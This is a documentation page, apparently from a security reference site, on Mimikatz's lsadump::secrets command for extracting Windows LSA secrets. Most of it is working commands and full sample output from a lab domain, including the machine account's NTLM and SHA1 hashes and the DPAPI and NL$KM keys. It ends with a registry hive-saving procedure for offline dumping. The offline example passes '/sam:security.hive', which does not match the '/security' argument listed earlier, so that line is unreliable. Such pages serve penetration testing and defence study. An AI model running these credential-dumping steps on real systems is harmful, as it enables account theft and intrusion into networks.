# secrets

`lsadump::secrets` can be used to [dump LSA secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets) from the registries. It retrieves the `SysKey` to decrypt `Secrets` entries. It has the following command line arguments:

* `/system` : The `SYSTEM` hive
* `/security` : The `SECURITY` hive

The registry key for the LSA secrets is `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets`.

{% hint style="info" %}
LM and NT hashes are used to authenticate accounts using the NTLM protocol. These hashes are often called NTLM hash and many documentations, resources, blogpost and tools mix terms. In this case, "NTLM" refers to the NT hash.

([more information](https://www.thehacker.recipes/ad/movement/ntlm))
{% endhint %}

{% hint style="warning" %}
This command requires elevated privileges (by previously running [privilege::debug](https://tools.thehacker.recipes/mimikatz/modules/privilege/debug) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # lsadump::secrets
Domain : WIN10
SysKey : 7e6804db6db0bbc15372ddf840962151

Local name : WIN10 ( S-1-5-21-1604892360-3618202543-1602915806 )
Domain name : hacklab ( S-1-5-21-2725560159-1428537199-2260736313 )
Domain FQDN : hacklab.local

Policy subsystem is : 1.18
LSA Key(s) : 1, default {9b57ea93-9de6-5d50-0497-034513ddc692}
  [00] {9b57ea93-9de6-5d50-0497-034513ddc692} 62dd3714cc6d8e08f2c90bb18d949eb4e7fddb2478342640c5dc78a68d165e05

Secret  : $MACHINE.ACC
cur/hex : 72 63 fe b7 2d bf 2f b3 6c c0 d4 f4 e7 2c 89 f0 79 9e 58 ee 28 38 90 11 40 57 a6 8a 06 cc 1b 64 6f 0e b7 10 fe 71 22 a5 13 ef 2d fa 9a 8d 77 37 45 10 8f f5 c2 9a b4 ef 39 8d 24 e5 2c ba 56 01 bc ae 1e be 87 bc c2 1d 42 d8 1f a8 a1 89 24 39 2c 0e 0f ce c3 62 9d ed 8a 22 4e 01 42 b9 9e 7f ac 81 d6 49 c6 7e c3 ec a1 3a e4 66 45 49 df 7e 42 34 74 c3 8c 57 3a 73 30 76 ea 3d 71 a0 ae 47 5e 25 fa 1f 01 d8 4b 35 07 5e 2e 3e 91 34 b4 02 76 13 aa 6a 14 44 87 44 9b 53 eb df 29 55 e0 bb 45 4d d9 cb 72 d2 ef 56 da 79 a0 05 bb f6 3c a4 5e 1f 0e 15 09 28 53 cc 3e fd 76 ea 29 64 97 21 c7 77 44 9e 36 6c 97 02 0c 06 7f ee 42 c4 44 c9 d8 d2 d4 7f fb 2f 80 23 75 da 3c 1a 3e 20 49 5c 94 68 63 cd 98 c5 30 90 b0 3c e4 3c 1b 29 0e fb
    NTLM:18a5bde65ac97f8c222214e61858218b
    SHA1:c88180373af4910b62c11c00d534de676bd8047b
old/text: 8us/0-5sE3:_bd4\B+nEqpI#j,[avKJ'7l5RpDew]EEXya=tZq7g,jAifx%-sgv)Seto+@aPtf];gmb=gSE4K?"D\B+ CBW>vD5*/k71q'iI#V4$otG4t9R[
    NTLM:2c60cae5c83d27b349e98662de463dfc
    SHA1:fd6e6c6616156dac734f87d1eec386fa29537d89

Secret  : DefaultPassword

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 2e f9 1d 55 e4 48 9b 62 c5 b6 fc da 08 59 8e 8c 9c b7 66 0e 72 a3 f9 7f 1c 35 ee d8 7f 47 c0 5e 3a 82 91 19 58 7f 24 77
    full: 2ef91d55e4489b62c5b6fcda08598e8c9cb7660e72a3f97f1c35eed87f47c05e3a829119587f2477
    m/u : 2ef91d55e4489b62c5b6fcda08598e8c9cb7660e / 72a3f97f1c35eed87f47c05e3a829119587f2477
old/hex : 01 00 00 00 2f 0f f4 5b 22 a8 e6 67 5b d9 49 c7 1d 21 ca aa 2a 11 59 bb 9f f3 b2 2a f3 13 e8 0a 0e 60 d3 4b 9e cc 6d 43 89 fd 17 86
    full: 2f0ff45b22a8e6675bd949c71d21caaa2a1159bb9ff3b22af313e80a0e60d34b9ecc6d4389fd1786
    m/u : 2f0ff45b22a8e6675bd949c71d21caaa2a1159bb / 9ff3b22af313e80a0e60d34b9ecc6d4389fd1786

Secret  : NL$KM
cur/hex : ae d1 f5 13 aa 67 ca 20 e6 8c a6 71 99 45 fe 0a b9 c8 3f e0 00 4d 0c a5 6b 1c 32 70 39 cf ee e8 f2 88 ff 54 fd a2 4f bd 07 be d6 ab 5d cb 2e bb 2a 0d ba c3 ae 92 d5 68 16 c2 f0 1c 53 52 2f 1d
old/hex : ae d1 f5 13 aa 67 ca 20 e6 8c a6 71 99 45 fe 0a b9 c8 3f e0 00 4d 0c a5 6b 1c 32 70 39 cf ee e8 f2 88 ff 54 fd a2 4f bd 07 be d6 ab 5d cb 2e bb 2a 0d ba c3 ae 92 d5 68 16 c2 f0 1c 53 52 2f 1d
```

### Offline Dumping

At first the `SYSTEM` and `SECURITY` hives must be obtained:

```
reg save HKLM\SYSTEM system.hive
reg save HKLM\security security.hive
```

Then the saved backups of `SYSTEM` and `SECURITY` hives can also be used offline:

```
mimikatz # lsadump::secrets /system:system.hive /sam:security.hive
```
